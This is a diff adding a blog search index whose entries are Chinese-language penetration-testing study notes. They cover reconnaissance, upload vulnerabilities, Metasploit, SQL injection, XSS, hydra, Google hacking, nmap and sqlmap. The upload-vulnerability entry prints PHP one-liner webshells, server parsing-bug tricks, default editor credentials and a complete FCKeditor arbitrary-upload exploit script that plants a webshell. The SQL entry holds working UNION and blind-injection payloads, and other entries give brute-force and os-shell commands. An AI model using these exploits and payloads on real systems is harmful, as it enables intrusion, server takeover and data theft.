@@ -1,0 +1,232 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>浅谈信息收集</title>
+      <link href="/2019/08/24/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
+      <url>/2019/08/24/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
+      
+        <content type="html"><![CDATA[<p>1.查询真实IP</p><a id="more"></a><p>（方便等下扫端口）<br>超级ping：<a href="http://ping.chinaz.com/" target="_blank" rel="noopener">http://ping.chinaz.com/</a><br>如果只有一个IP说明没有使用CDN<br>如果有多个IP说明使用了CDN<br>2.开放端口探测<br>使用nmap扫描端口<br>命令如下<br>nmap -Ss ip地址<br>（半开扫描，不容易被防火墙拦截）<br>3.whois信息<br>在线工具：<a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a><br>4.子域名<br>意义：当主站难以下手的时候，可以通过子站来渗透<br>方法一：<br>google语法<br>site:baidu.com -www<br>排除不感兴趣的子域名<br>方法二：<br>在线工具：<br><a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a><br>方法三：<br>爆破枚举<br>1.layer子域名挖掘机<br>2.subDomainsBrute</p><p>只是简单说一下基本方法，不够全面</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息收集 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 信息收集 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>上传漏洞</title>
+      <link href="/2019/08/21/%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
+      <url>/2019/08/21/%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
+      
+        <content type="html"><![CDATA[<p>文件过滤中，如何验证文件后缀</p><a id="more"></a><p>1.文件头验证<br>2.文件类型验证<br>3.文件后缀验证</p><p>修改文件头，伪造文件属性<br>修改文件类型，伪造文件类型，MIME绕过（抓包改包）<br>增加多重后缀，伪造文件后缀，命名绕过</p><p>Js本地验证<br>%00截断上传<br>(k1.php%00.jpg)   %00—&gt;url编码<br>Burp抓包</p><p>常见的MIME类型<br>　　超文本标记语言文本 .html text/html<br>　　普通文本 .txt text/plain<br>　　RTF文本 .rtf application/rtf<br>　　GIF图形 .gif image/gif<br>　　JPEG图形 .jpeg,.jpg image/jpeg<br>　　au声音文件 .au audio/basic<br>　　MIDI音乐文件 mid,.midi audio/midi,audio/x-midi<br>　　RealAudio音乐文件 .ra, .ram audio/x-pn-realaudio<br>　　MPEG文件 .mpg,.mpeg video/mpeg<br>　　AVI文件 .avi video/x-msvideo<br>　　GZIP文件 .gz application/x-gzip<br>　　TAR文件 .tar application/x-tar</p><p>编辑器上传漏洞利用<br>网站编辑器：<br>Eweb,fck,ce,cfinder,ck  第三方组件<br>编辑器漏洞利用：<br>获取编辑器的名称及版本信息<br>扫描爬行或字典扫描 探针<br>观察图片的地址或编辑器特征<br>获取编辑器相关的漏洞<br>利用编辑器漏洞进行攻击测试<br>Ewebeditor：<br>默认后台：ewebeditor/admin_login.asp<br>默认数据库：ewebeditor/db/ewebeditor.mdb<br>默认账号密码：admin admin/admin888<br>FCK<br>查看版本：/_whatsnew.html<br>编辑器页：/_samples/default.html<br>.htaccess<br>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><p>代码：<br>&lt;filesmatch “wtf”&gt;<br>sethandler application/x-httpd-php<br><br>实战意义：<br>1.如果存在可以上传.htaccss文件，就可以直接利用规则解析<br>2.如果存在修改.htaccess文件权限，修改解析规则<br>IIS 5.x/6.0解析漏洞<br>IIS 6.0解析利用方法有两种<br>1.目录解析<br>/xx.asp/xx.jpg<br>2.文件解析<br>xx.asp;.jpg<br>第一种，在网站下建立文件夹的名字为 .asp、.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。<br>例如创建目录 xx.asp，那么<br>/xx.asp/1.jpg<br>将被当作asp文件来执行。假设黑阔可以控制上传文件夹路径,就可以不管你上传后你的图片改不改名都能拿shell了。<br>第二种，在IIS6.0下，分号后面的不被解析，也就是说<br>xx.asp;.jpg<br>会被服务器看成是xx.asp<br>还有IIS6.0 默认的可执行文件除了asp还包含这三种<br>/xx.asa /xx.cer /xx.cdx<br>IIS 7.0/IIS 7.5/ Nginx &lt;8.03畸形解析漏洞<br>Nginx解析漏洞这个伟大的漏洞是我国安全组织80sec发现的…<br>在默认Fast-CGI开启状况下,黑阔上传一个名字为xx.jpg，内容为<br><?PHP fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>‘);?&gt;<br>的文件，然后访问xx.jpg/.php,在这个目录下就会生成一句话木马 shell.php<br>Nginx &lt;8.03 空字节代码执行漏洞<br>影响版:0.5.,0.6., 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37<br>Nginx在图片中嵌入PHP代码然后通过访问<br>xxx.jpg%00.php<br>来执行其中的代码<br>Apache解析漏洞<br>Apache 是从右到左开始判断解析,如果为不可识别解析,就再往左判断.<br>比如 xx.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把xx.php.owf.rar解析成php.<br>如何判断是不是合法的后缀就是这个漏洞的利用关键,测试时可以尝试上传一个wooyun.php.rara.jpg.png…（把你知道的常见后缀都写上…）去测试是否是合法后缀<br>其他<br>在windows环境下，xx.jpg[空格] 或xx.jpg. 这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点,黑客可以通过抓包，在文件名后加一个空格或者点绕过黑名单.若上传成功，空格和点都会被windows自动消除,这样也可以getshell。<br>如果在Apache中.htaccess可被执行.且可被上传.那可以尝试在.htaccess中写入:<br>&lt;FilesMatch “xx.jpg”&gt; SetHandler application/x-httpd-php <br>然后再上传shell.jpg的木马, 这样shell.jpg就可解析为php文件。</p><p>FCK编辑器漏洞<br>/3/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=File&amp;CurrentFolder=%2F&amp;NewFolderName=a<br>CurrentFolder=/&amp;NewFolderName=a   /a<br>CurrentFolder=/a,asp&amp;NewFolderName=a     /a.asp/a<br>Ewebeditror   fck漏洞利用<br>目录遍历<br>/ewebeditor/admin_uploadfile.asp?id=42&amp;dir=../../..<br>FCK=&lt;=2.63 EXP<br><?phperror_reporting(0);set_time_limit(0);ini_set("default_socket_timeout", 5);define(STDIN, fopen("php://stdin", "r"));$match = array();function http_send($host, $packet){$sock = fsockopen($host, 80);while (!$sock){print "\n[-] No response from {$host}:80 Trying again...";$sock = fsockopen($host, 80);}fputs($sock, $packet);while (!feof($sock)) $resp .= fread($sock, 1024);fclose($sock);print $resp;return $resp;}function connector_response($html){global $match;return (preg_match("/OnUploadCompleted\((\d),\"(.*)\"\)/", $html, $match) && in_array($match[1], array(0, 201)));}print "\n+------------------------------------------------------------------+";print "\n| FCKEditor Servelet Arbitrary File Upload Exploit |";print "\n+------------------------------------------------------------------+\n";if ($argc < 3){print "\nUsage......: php $argv[0] host path\n";print "\nExample....: php $argv[0] localhost /\n";print "\nExample....: php $argv[0] localhost /FCKEditor/\n";die();}$host = $argv[1];$path = ereg_replace("(/){2,}", "/", $argv[2]);$filename = "fvck.gif";$foldername = "fuck.php%00.gif";$connector = "editor/filemanager/connectors/php/connector.php";$payload = "-----------------------------265001916915724\r\n";$payload .= "Content-Disposition: form-data; name=\"NewFile\"; filename=\"{$filename}\"\r\n";$payload .= "Content-Type: image/jpeg\r\n\r\n";$payload .= 'GIF89a'."\r\n".'<?php eval($_POST[wtf]) ?>‘.”\n”;<br>$payload .= “—————————–265001916915724–\r\n”;<br>$packet = “POST {$path}{$connector}?Command=FileUpload&amp;Type=Image&amp;CurrentFolder=”.$foldername.” HTTP/1.0\r\n”;//print $packet;<br>$packet .= “Host: {$host}\r\n”;<br>$packet .= “Content-Type: multipart/form-data; boundary=—————————265001916915724\r\n”;<br>$packet .= “Content-Length: “.strlen($payload).”\r\n”;<br>$packet .= “Connection: close\r\n\r\n”;<br>$packet .= $payload;<br>print $packet;<br>if (!connector_response(http_send($host, $packet))) die(“\n[-] Upload failed!\n”);<br>else print “\n[-] Job done! try http://${host}/$match[2] \n”;<br>?&gt;<br>webshell密码：wtf</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>MSF简单使用</title>
+      <link href="/2019/08/20/MSF%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"/>
+      <url>/2019/08/20/MSF%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
+      
+        <content type="html"><![CDATA[<p>MSF常用命令</p><a id="more"></a><p>Help 帮助<br>Back 返回<br>? 查看命令帮助<br>Show 列出所有<br>Show payload 列出所有攻击载荷<br>Search name 搜索<br>Info 展示出指定渗透攻击或模块的相关信息<br>Use 选择一个渗透攻击或模块</p><p>1.打开MSF<br>2.选择模块 use name<br>3.查看模块需要哪些信息 show op<br>4.告诉MSF所需的信息 set 变量 值<br>5.你要告诉MSF 入侵 之后 你要他的CMD  或者 什么都不做 我就想执行一条命令 但是后面我还想控制<br>6.Set payload name 选择其中一个payload<br>7.启动 run</p><p>Show targers 列出渗透攻击所支持的目标平台</p><p>payload名称命名规则：<br>_find_tag:在一个已建立的连接上<br>_reverse_tcp:反向连接到攻击者主机<br>bind_tcp:监听一个tcp连接<br>reverse_http：反向连接 通过HTTP隧道</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 工具 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 工具 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SQL注入</title>
+      <link href="/2019/08/20/SQL%E6%B3%A8%E5%85%A5/"/>
+      <url>/2019/08/20/SQL%E6%B3%A8%E5%85%A5/</url>
+      
+        <content type="html"><![CDATA[<p>常用函数</p><a id="more"></a><pre><code>version()  MySQL 版本user()  数据库用户名database() 数据库名@@datadir 数据库路径@@version_compile_os  操作系统版本hex() 把十进制转为十六进制concat() 连接字符串ascii() ascii编码length() 获取长度substring() mid（） 取出字符串group_concat() 连接一个组的所有字符串 以逗号分隔每一条数据updatexml()、extractvalue() 用于报错注入sleep（）  休眠</code></pre><p>魔术引号<br> magic_quotes_gpc 本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。<br>安全函数<br>addslashes()<br>当打开时，所有的 ‘（单引号），”（双引号），\（反斜线）和 NULL 字符都会被自动加上一个反斜线进行转义。这和 addslashes() 作用完全相同。<br>绕过思路<br>编码绕过<br>宽字节绕过<br>Mysql高权限垮库注入<br>需要root权限<br>网站A 无注入 网站B有MYSQL注入 并且被统一管理的话<br>可以实现Mysql高权限垮库注入<br>查询所有库名<br><a href="http://127.0.0.1/sql/0.php?id=8" target="_blank" rel="noopener">http://127.0.0.1/sql/0.php?id=8</a> UNION SELECT 1,group_concat(schema_name),3 from information_schema.schemata<br>获取指定数据库的所有表名<br><a href="http://127.0.0.1/sql/0.php?id=8" target="_blank" rel="noopener">http://127.0.0.1/sql/0.php?id=8</a> UNION SELECT 1,group_concat(table_name),3 from information_schema.tables where table_schema=十六进制dataname<br>获取指定表的列名<br><a href="http://127.0.0.1/sql/0.php?id=8" target="_blank" rel="noopener">http://127.0.0.1/sql/0.php?id=8</a> UNION SELECT 1,group_concat(column_name),3 from information_schema.columns where table_name=十六进制tablename</p><p>获取指定数据<br><a href="http://127.0.0.1/sql/0.php?id=8" target="_blank" rel="noopener">http://127.0.0.1/sql/0.php?id=8</a> UNION SELECT 1,username,userpwd from ekucms.ekud249_user<br>提交方式注入<br>POST登录框注入<br>先加’在构建SQL注入语句<br>Cookie验证注入<br>抓包改包注入<br>HTTP头部注入<br>实际情况下，有部分站点接受数据是以http数据包中的http头部进去数据接受，所以测试注入点的时候，需要将注入语句写到http头部中<br>写到该写的地方<br>参数类型注入<br>数字，字符，搜索<br>数字型：<br>$id=$_GET[‘x’]<br>Select * from news where id=1<br>字符型：<br>$id=$_GET[‘x’]<br>Select * from news where id=’admin’<br>先加’ 再构建SQL语句<br>搜索型：<br>$id=$_GET[‘x’]<br>Select * from news where id=’%mst%’<br>先加%’ </p><p>加解密注入<br>常用加密方式<br>URL编码 base64 …..</p><p>普通联合注入和盲注区别<br>普通注入：效率高 兼容性差<br>盲注：效率低 兼容性高<br>基于时间延长注入<br>Sleep()延时<br>If(条件,真,假)条件判断<br>Mid(str,1,1) 截取<br>Ord ascii()<br>Length()<br>获取数据库名长度<br><a href="http://127.0.0.1/sql/0.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql/0.php?id=1</a> and sleep(if((select length(database()) = 7),0,5))<br>获取表名<br>Union select 1,2,3 sleep(if(length(table_name) = 4,0,5)) from information_schema.tables where table_schema =database() limit 0,1</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>XSS</title>
+      <link href="/2019/08/20/XSS/"/>
+      <url>/2019/08/20/XSS/</url>
+      
+        <content type="html"><![CDATA[<p>XSS原理：输出问题导致的js代码被识别执行</p><a id="more"></a><p>Xss技术分类<br>反射型（非持久型）<br>存储型（持久型）<br>DOM型<br>Xss常见攻击<br>Xss漏洞发现并利用<br>Beef使用<br>Cookie维持权限应用<br>条件<br>1.已经获得网站webshell权限<br>2.网站后台目录文件有可写权限<br>利用原理<br>通过修改后台登录成功指向文件,利用js代码获取每次登录成功的cookie(管理员权限)<br>Xss相关防护过滤及绕过分析<br>防护：<br>1.关键字过滤<br>2.特殊符号过滤<br>3.字符长度过滤<br>4.转义编码防护<br>绕过：<br>1.改变大小写<br>2.使用空白符<br>3.HEX编码<br>4.其他标签调用<br>5.Js自带函数</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>hydra使用</title>
+      <link href="/2019/08/04/hydra%E4%BD%BF%E7%94%A8/"/>
+      <url>/2019/08/04/hydra%E4%BD%BF%E7%94%A8/</url>
+      
+        <content type="html"><![CDATA[<p>hydra参数详解<br>-R：继续从上一次进度接着破解<br>-S：大写，采用SSL链接</p><a id="more"></a><p>-s <port>：小写，可通过这个参数指定非默认端口<br>-l <login>：指定破解的用户，对特定用户破解<br>-L <file>：指定用户名字典<br>-p <pass>：小写，指定密码破解，少用，一般是采用密码字典<br>-P <file>：大写，指定密码字典<br>-e <ns>：可选选项，n：空密码试探，s：使用指定用户和密码试探<br>-C <file>：使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数<br>-M <file>：指定目标列表文件一行一条<br>-o <file>：指定结果输出文件<br>-f：在使用-M参数以后，找到第一对登录名或者密码的时候中止破解<br>-t <tasks>：同时运行的线程数，默认为16<br>-w <time>：设置最大超时的时间，单位秒，默认是30s<br>-v / -V：显示详细过程<br>-o 可导出文件<br>server：目标ip </time></tasks></file></file></file></ns></file></pass></file></login></port></p><p>hydra -L ./user.txt -P ./pass.txt -t 2 -e n -f -v -s 3306 192.168.0.57 mysql<br>爆破mysql</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 工具 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 工具 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>googlehacking</title>
+      <link href="/2019/07/30/googlehacking/"/>
+      <url>/2019/07/30/googlehacking/</url>
+      
+        <content type="html"><![CDATA[<p>Google搜索基本符号意义</p><a id="more"></a><p>“”<br>完全匹配搜索<br>+<br>指定一个一定存在的关键词<br>-<br>排除关键词<br>|<br>或，只要满足其中一个就行<br>AND<br>同时满足两个关键词<br>site搜索语法的意义<br>作用：<br>1.可以针对目标做一个准确的信息收集（目录 文件）<br>2.得到目标的子域名<br>3.查找后台<br>Site:<br>//搜索指定域名下的结果<br>Site:baidu.com<br>Inurl搜索语法的意义<br>批量找后台，找注入点，批量找指定漏洞目标网站点等等<br>Inurl:baidu.com<br>//表示搜索结果的URL中一定含有baidu.com这个关键词<br>批量找后台<br>找注入点，<br>批量找指定漏洞目标网站点<br>等等<br>Intitle搜索语法的意义<br>批量寻找后台，批量寻找弱点网站<br>Intitle:<br>//搜索标题为指定内容的结果<br>可以使用不同的关键词，达到同样的效果<br>组合使用<br>inurl:    intitle:<br>Cache缓存搜索<br>Cache<br>//类似于百度快照功能<br>用途<br>找物理路径时，网站异常被恢复时可以使用这个语法来进行搜索<br>查看网站被删除信息时，也可以使用这个语法</p><p>Tips：<br>搜索语法使用时，百度和谷歌尽量都尝试一遍</p><p>拓展玩法<br>1.找管理员账户名<br>2.找目标脚本语言<br>3.找C段主机<br>4.找弱点站</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息收集 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 信息收集 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>nmap使用</title>
+      <link href="/2019/07/26/nmap%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"/>
+      <url>/2019/07/26/nmap%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</url>
+      
+        <content type="html"><![CDATA[<p>tips:不定时更新，边学变更新<br>-iL<br>扫文本<br>nmap -iL test.txt</p><a id="more"></a><p>–exclude<br>排除IP<br>nmap 192.168.0.* –exclue 192.168.0.1<br>-sA<br>是否开防火墙</p><p>检测主机在线<br>-sP</p><p>-p<br>只扫描哪些端口</p><p>-sS<br>半开扫描</p><p>-T4<br>级别越高，速度越快</p><p>-A<br>全面系统检测、启用脚本检测、扫描等</p><p>-v<br>显示扫描过程</p><p>Nmap探测WAF有两种脚本，<br>一种是http-waf-detect，命令：nmap -p80,443 –script=http-waf-detect ip<br>一种是http-waf-fingerprint。命令：nmap -p80,443 –script=http-waf-fingerprint ip</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 工具 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 工具 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SQLmap学习笔记</title>
+      <link href="/2019/07/25/SQLmap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+      <url>/2019/07/25/SQLmap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+      
+        <content type="html"><![CDATA[<p>SQLmap学习笔记<br>–常用参数<br>-u 检测注入<br>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1”</p><a id="more"></a><p>–data 针对POST请求的链接<br>python sqlmap.py -u “127.0.0.1/sql/0.php” –data=”id=1”</p><p>–forms 检测表单是否存在注入<br>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1” –forms</p><p>–level 等级 1-5<br>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1” –level 3</p><p>–dbs 列出所有库<br>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1” –dbs</p><p>–current-db 列出当前库<br>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1” –current-db</p><p>–tables -D”” 指定库里的所有表<br>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1” –tables -D”saltest”</p><p>–tables 所有表<br>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1” –tables</p><p>–dump -T”” -D”” -C”” 指定列下的字段<br>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1” –dump -T”news” -D “sqltest” -C”id”</p><p>–current-user 当前用户名<br>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1” –current-user</p><p>–os-shell 打开一个终端<br>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1” –os-shell</p><p>-m 扫描文本里的地址<br>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1” -m “绝对路径”</p><p>-l 通过burp的日志文件检测注入<br>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1” -l “文件路径”</p><p>–tamper=”” Tamper脚本运用<br>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1” –tamper=”between.py”</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 工具 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 工具 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
